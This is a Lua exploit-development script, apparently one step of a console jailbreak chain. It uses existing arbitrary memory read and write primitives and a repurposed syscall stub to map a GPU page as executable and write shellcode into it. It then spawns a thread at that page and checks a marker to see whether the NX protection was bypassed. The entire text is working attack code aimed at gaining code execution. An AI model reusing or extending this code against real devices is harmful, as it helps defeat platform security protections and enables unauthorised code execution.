-- CRASH_CLASS: HIGH
-- PROBE 940d: GPU execution test, minimal and self-reporting.
-- Page bytes: 48 89 38   mov [rax], rdi      -- write the marker
--             EB FE      jmp $               -- spin, so the child never returns into garbage
-- The child spins inside the GPU page; the main thread sleeps briefly and reads the marker.
-- Marker set  -> the GPU page executed.  Process gone before the read -> NX fault.
print("=== PROBE 940e: GPU exec marker, no nanosleep ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then local ok, n = pcall(function() return v:tonumber() end); if ok and n then return n end end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(a, v) return (pcall(function() memory.write_qword(a, v) end)) end
local function wb(a, v) return (pcall(function() memory.write_byte(a, v) end)) end
local function rq(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end return nil end
local function fmt(v) local h, l = 0, to_num(v); if type(v) == "table" and v.h then h, l = v.h, v.l end; return string.format("0x%X%08X", h, l) end
local sc_mmap, sc_thr, sc_sleep = mk(477), mk(430), mk(240)
local fn
do
    local s = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
    if s then fn = tonumber(s:sub(3), 16) end
end
print("[0] fn=" .. tostring(fn and string.format("0x%X", fn) or "nil"))
local PAGE = 0x4000
local ok, gpu = pcall(function() return sc_mmap(uint64(0), uint64(PAGE * 4), uint64(7), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local base = ok and to_num(gpu) or 0
print("[1] GPU=" .. fmt(base))
if base == 0 or base == 0xFFFFFFFFFFFFFFFF then print("[Z] DONE"); return end
for i, byte in ipairs({ 0x48, 0x89, 0x38, 0xEB, 0xFE }) do wb(base + i - 1, byte) end
print("[2] page=" .. fmt(rq(base) or 0))
local out = memory.alloc(0x20)
wq(out, 0)
local ctx = memory.alloc(0x140)
for i = 0, 0x13C, 8 do wq(ctx + i, 0) end
local stack = memory.alloc(0x100)
for i = 0, 0xF8, 8 do wq(stack + i, 0) end
pcall(function() memory.write_dword(ctx + 0x0C0, 0x43) end)
pcall(function() memory.write_dword(ctx + 0x100, 0x3B) end)
wq(ctx + 0x0E0, base)            -- RIP = GPU page
wq(ctx + 0x0F8, stack)
wq(ctx + 0x108, 0x480)
wq(ctx + 0x110, 0x10000)
wq(ctx + 0x0D0, 0)
wq(ctx + 0x048, 0x4142434445464748)  -- RDI = marker
wq(ctx + 0x078, out)                 -- RAX = destination
local ok2, rv2 = pcall(function() return sc_thr(uint64(ctx), uint64(0)) end)
print("[3] spawn=" .. tostring(ok2 and fmt(rv2) or "pcall-fail"))
local got = rq(out)
print("[3a] marker-now=" .. tostring(got and fmt(got) or "nil"))
local acc = 0
for i = 1, 4000000 do acc = acc + i % 7 end
got = rq(out)
print("[4] marker=" .. tostring(got and fmt(got) or "nil"))
if got and to_num(got) ~= 0 then print("[4] EXECUTED GPU PAGE") end
print("[Z] DONE")
